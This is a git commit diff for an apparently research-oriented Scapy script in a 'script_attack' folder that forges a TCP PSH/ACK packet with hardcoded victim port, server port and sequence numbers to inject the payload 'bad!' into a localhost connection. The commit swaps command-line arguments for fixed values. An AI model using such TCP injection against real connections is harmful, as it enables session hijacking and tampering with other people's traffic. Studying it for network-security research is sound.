7cea264cb12fe9465f7d2c350731c35317cfdd40
olivero <olivero@eurecom.fr>
2018-05-20 23:15:46 +0200

    change overlapping pcap file

--- script_attack/scapy_attack_phack_overlapping.py
+++ script_attack/scapy_attack_phack_overlapping.py
@@ -1,29 +1,33 @@
+import sys
 import scapy3k.all as scapy
 import socket
 import struct
-import sys
+
 
 scapy.conf.L3socket
 scapy.conf.L3socket=scapy.L3RawSocket
 
-if len(sys.argv)<4:
-	# args to be sent to machineA
-	full_message =  "bad!"
-
-	# connection establishment
-	#Put the victim's port
-	sport = sys.argv[0]
-	src=dest="127.0.0.1"
-	#Put the server port
-	dport=sys.argv[1]
-	ip=scapy.IP(src=src,dst=dest)
-	# put the seqence number and the ack of the previous ACK created by the previous messages. 
-	PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=sys.argv[2],ack=sys.argv[3])
-	scapy.send(ip/PHACK/full_message)
-else:
+"""if len(sys.argv)<4:
 	print("not enough arguments")
 	print("src port of the victim, server port, seq number, ack number")
-	
+
+else:"""
+# args to be sent to machineA
+full_message =  "bad!"
+
+# connection establishment
+#Put the victim's port
+sport = 42168
+src=dest="127.0.0.1"
+#Put the server port
+dport=4446
+ip=scapy.IP(src=src,dst=dest)
+# put the seqence number and the ack of the previous ACK created by the previous messages.
+PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=1790383696,ack=1054105548)
+scapy.send(ip/PHACK/full_message)
+
+
+
 
 
 # to be nice, you should send the FIN/ACK, ACK pkts now ...
